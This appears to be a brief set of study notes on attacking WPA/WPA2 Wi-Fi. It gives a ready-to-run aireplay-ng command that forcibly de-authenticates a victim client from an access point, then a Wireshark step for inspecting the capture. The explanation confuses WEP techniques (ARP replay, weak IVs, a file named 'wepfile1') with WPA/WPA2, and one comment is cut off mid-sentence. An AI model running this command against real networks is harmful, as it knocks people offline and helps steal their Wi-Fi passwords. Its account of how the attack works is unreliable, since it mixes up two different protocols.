# WPA/WPA2 Attacks

### De-authentication attack

Forcing the client to disconnect

```bash
#-0 deauth attack
#1 number of deauth attack packet to send 
aireplay-ng -0 1 -a <AP-mac-addr> -c <Victim-mac-addr> mon0

# On Client machine, observe that continuous ping is broken suddenly (the client has de-authenticated and tries to re-connect. In this process, the process is being monitored by our )

# view the packets (total 4 of them in the fake authentication of mac to accesspoint)
wireshark wepfile1
```

By capturing these arp packets, an attacker is able to use this to generate a large number of weak IV - subsequently able to crack the password

